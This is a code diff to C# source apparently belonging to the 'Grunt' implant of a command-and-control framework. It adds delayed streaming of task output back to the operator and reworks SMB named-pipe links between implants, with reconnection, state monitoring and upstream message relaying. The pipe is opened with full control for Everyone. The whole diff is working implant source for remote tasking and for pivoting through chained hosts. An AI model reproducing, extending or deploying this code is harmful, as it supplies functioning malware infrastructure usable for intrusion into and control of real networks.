@@ -179,7 +179,7 @@ namespace GruntExecutor
                                     impersonationContext.Undo();
                                 }
                                 IntPtr impersonatedToken = IntPtr.Zero;
-                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message));
+                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message, Delay));
                                 t.Start();
                                 Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                 bool completed = t.Join(5000);
@@ -199,7 +199,7 @@ namespace GruntExecutor
                             }
                             else
                             {
-                                Thread t = new Thread(() => TaskExecute(messenger, message));
+                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));
                                 t.Start();
                                 Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                             }
@@ -227,7 +227,7 @@ namespace GruntExecutor
             }
         }
 
-        private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message)
+        private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
         {
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
@@ -283,6 +283,14 @@ namespace GruntExecutor
                                                         }
                                                         catch (Exception) {}
                                                     }
+                                                    currentRead = "";
+                                                    lastTime = DateTime.Now;
+                                                }
+                                                else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
+                                                {
+                                                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
+                                                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                    messenger.WriteTaskingMessage();
                                                     currentRead = "";
                                                     lastTime = DateTime.Now;
                                                 }
@@ -396,6 +404,10 @@ namespace GruntExecutor
             this.Crafter = Crafter;
             this.UpstreamMessenger = Messenger;
             this.Profile = Profile;
+            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
+                this.QueueTaskingMessage(e.Message);
+                this.WriteTaskingMessage();
+            };
         }
 
         public GruntTaskingMessage ReadTaskingMessage()
@@ -485,34 +497,35 @@ namespace GruntExecutor
             SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);
             Thread readThread = new Thread(() =>
             {
-                while (true)
+                while (downstream.IsConnected)
                 {
                     try
                     {
                         ProfileMessage read = downstream.Read();
-                        if (downstream.Identifier == "")
+                        if (read != null && !string.IsNullOrEmpty(read.Message))
                         {
-                            GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read.Message);
-                            if (message.GUID.Length == 20)
+                            if (string.IsNullOrEmpty(downstream.Identifier))
                             {
-                                downstream.Identifier = message.GUID.Substring(10);
+                                GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read.Message);
+                                if (message.GUID.Length == 20)
+                                {
+                                    downstream.Identifier = message.GUID.Substring(10);
+                                }
+                                else if (message.GUID.Length == 10)
+                                {
+                                    downstream.Identifier = message.GUID;
+                                }
                             }
-                            else if (message.GUID.Length == 10)
-                            {
-                                downstream.Identifier = message.GUID;
-                            }
+                            this.UpstreamMessenger.Write(read.Message);
                         }
-                        this.UpstreamMessenger.Write(read.Message);
-                    }
-                    catch (ThreadAbortException)
-                    {
-                        return;
                     }
                     catch (Exception e)
                     {
                         Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                     }
                 }
+                // Connection became disconnected and therefore we remove the downstream object
+                this.DownstreamMessengers.Remove(downstream);
             });
             downstream.ReadThread = readThread;
             downstream.ReadThread.Start();
@@ -537,94 +550,197 @@ namespace GruntExecutor
 
 	public class SMBMessenger : IMessenger
     {
-        public string Hostname { get; } = "";
-        public string Identifier { get; set; } = "";
-        public string Authenticator { get; set; } = "";
-
-        private object _WritePipeLock = new object();
-        private PipeStream Pipe { get; set; }
-        private string PipeName { get; }
+        public string Hostname { get; } = string.Empty;
+        public string Identifier { get; set; } = string.Empty;
+        public string Authenticator { get; set; } = string.Empty;
+        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
         public Thread ReadThread { get; set; } = null;
 
-        public SMBMessenger(NamedPipeServerStream ServerPipe, string PipeName)
+        private string PipeName { get; } = null;
+        // Thread that monitors the status of the named pipe and updates _IsConnected accordingly.
+        private Thread MonitoringThread { get; set; } = null;
+        // This flag syncs communication peers in case one of the them dies (see method Read and Write)
+        private bool IsServer { get; set; }
+        private int Timeout { get; set; } = 5000;
+
+        private object _PipeLock = new object();
+        private PipeStream _Pipe;
+        private PipeStream Pipe
         {
-            this.PipeName = PipeName;
-            this.Hostname = "localhost:" + PipeName;
-            this.Pipe = ServerPipe;
-            new Thread(() =>
-            {
-                while (true)
-                {
-                    try
-                    {
-                        PipeSecurity ps = new PipeSecurity();
-                        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
-                        NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
-                        newServerPipe.WaitForConnection();
-                        lock (this._WritePipeLock)
-                        {
-                            this.Pipe.Close();
-                            this.Pipe = newServerPipe;
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.Error.WriteLine("NamedPipeServer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
-                    }
-                }
-            }).Start();
+            get { lock (this._PipeLock) { return this._Pipe; } }
+            set { lock (this._PipeLock) { this._Pipe = value; } }
         }
 
-        public SMBMessenger(string Hostname, string PipeName = "gruntsvc", int Timeout = 5000)
+        protected object _IsConnectedLock = new object();
+        private bool _IsConnected;
+        public bool IsConnected
+        {
+            get { lock (this._IsConnectedLock) { return this._IsConnected; } }
+            set { lock (this._IsConnectedLock) { this._IsConnected = value; } }
+        }
+
+        public SMBMessenger(string Hostname, string Pipename)
         {
             this.Hostname = Hostname;
-            this.PipeName = PipeName;
-            NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
-            ClientPipe.Connect(Timeout);
-            ClientPipe.ReadMode = PipeTransmissionMode.Byte;
-            this.Pipe = ClientPipe;
+            this.PipeName = Pipename;
+            this.IsServer = false;
+            this.InitializePipe();
+        }
+
+        public SMBMessenger(PipeStream Pipe, string Pipename)
+        {
+            this.Pipe = Pipe;
+            this.PipeName = Pipename;
+            this.IsServer = true;
+            if (Pipe != null && Pipe.IsConnected)
+            {
+                this.IsConnected = Pipe.IsConnected;
+                this.MonitorPipeState();
+            }
+            this.InitializePipe();
         }
 
         public ProfileMessage Read()
         {
-            return new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
+            ProfileMessage result = null;
+            try
+            {
+                // If the Grunt acts as SMB server, then after an interruption it shall wait in the read method until the connection 
+                // is re-established.
+                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
+                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
+                if (this.IsServer)
+                {
+                    this.InitializePipe();
+                }
+                if (this.IsConnected)
+                {
+                    result = new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
+                }
+            }
+            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
+            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
+            // try to restablish the named pipe
+            catch (IOException) { }
+            catch (NullReferenceException) { }
+            catch (ObjectDisposedException) { }
+            return result;
         }
 
         public void Write(string Message)
         {
-            this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
+            try
+            {
+                // If the Grunt acts as SMB client, then after an interruption it shall wait in the write method until the connection 
+                // is re-established.
+                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
+                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
+                if (!this.IsServer)
+                {
+                    this.InitializePipe();
+                }
+                if (this.IsConnected)
+                {
+                    this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
+                }
+            }
+            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
+            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
+            // try to restablish the named pipe
+            catch (IOException) { }
+            catch (NullReferenceException) { }
+            catch (ObjectDisposedException) { }
         }
 
         public void Close()
         {
-            lock (this._WritePipeLock)
+            // Close named pipe and terminate MonitoringThread by setting IsConnected to false
+            lock (this._PipeLock)
             {
-                this.Pipe.Close();
+                try
+                {
+                    if (this._Pipe != null)
+                    {
+                        this._Pipe.Close();
+                    }
+                }
+                catch (Exception) { }
+                this._Pipe = null;
+                this.IsConnected = false;
             }
-            if (ReadThread != null)
+        }
+
+        private void InitializePipe()
+        {
+            if (!this.IsConnected)
             {
-                this.ReadThread.Abort();
+                // If named pipe became disconnected (!this.IsConnected), then wait for a new incoming connection, else continue.
+                if (this.IsServer)
+                {
+                    PipeSecurity ps = new PipeSecurity();
+                    ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
+                    NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
+                    newServerPipe.WaitForConnection();
+                    this.Pipe = newServerPipe;
+                    this.IsConnected = true;
+                    this.MonitorPipeState();
+                    // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.
+                    this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });
+                }
+                // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.
+                else
+                {
+                    NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
+                    ClientPipe.Connect(Timeout);
+                    ClientPipe.ReadMode = PipeTransmissionMode.Byte;
+                    this.Pipe = ClientPipe;
+                    this.IsConnected = true;
+                    // Start the pipe status monitoring thread
+                    this.MonitorPipeState();
+                }
             }
+        }
+
+        private void MonitorPipeState()
+        {
+            this.MonitoringThread = new Thread(() =>
+            {
+                while (this.IsConnected)
+                {
+                    try
+                    {
+
+                        Thread.Sleep(1000);
+                        // We cannot use this.Pipe.IsConnected because this will result in a deadlock
+                        this.IsConnected = this._Pipe.IsConnected;
+                        if (!this.IsConnected)
+                        {
+                            this._Pipe.Close();
+                            this._Pipe = null;
+                        }
+                    }
+                    catch (Exception) { }
+                }
+            });
+            this.MonitoringThread.IsBackground = true;
+            this.MonitoringThread.Start();
         }
 
         private void WriteBytes(byte[] bytes)
         {
-            lock (this._WritePipeLock)
+            byte[] compressed = Utilities.Compress(bytes);
+            byte[] size = new byte[4];
+            size[0] = (byte)(compressed.Length >> 24);
+            size[1] = (byte)(compressed.Length >> 16);
+            size[2] = (byte)(compressed.Length >> 8);
+            size[3] = (byte)compressed.Length;
+            this.Pipe.Write(size, 0, size.Length);
+            var writtenBytes = 0;
+            while (writtenBytes < compressed.Length)
             {
-                byte[] compressed = Utilities.Compress(bytes);
-                byte[] size = new byte[4];
-                size[0] = (byte)(compressed.Length >> 24);
-                size[1] = (byte)(compressed.Length >> 16);
-                size[2] = (byte)(compressed.Length >> 8);
-                size[3] = (byte)compressed.Length;
-                this.Pipe.Write(size, 0, size.Length);
-                var writtenBytes = 0;
-                while (writtenBytes < compressed.Length)
-                {
-                    int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
-                    this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
-                    writtenBytes += bytesToWrite;
-                }
+                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
+                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
+                writtenBytes += bytesToWrite;
             }
         }
 
